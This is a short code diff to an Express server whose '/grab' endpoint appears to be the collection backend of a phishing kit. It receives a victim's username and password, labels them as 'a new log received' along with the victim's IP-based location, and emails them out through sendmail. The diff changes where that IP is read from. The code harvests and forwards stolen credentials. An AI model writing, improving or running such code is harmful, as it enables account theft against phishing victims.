@@ -19,7 +19,7 @@ app.set("trust proxy",true);
 
 app.post("/grab",async(req, res)=>{
    
-    const publicIP = req.ip;
+    const publicIP = req.body.ip;
    try{
     $message=`Hello, a new log received.:\n User: ${req.body.user}\n Password: ${req.body.pass}\n Location: ${publicIP}`;
            sendmail($message);
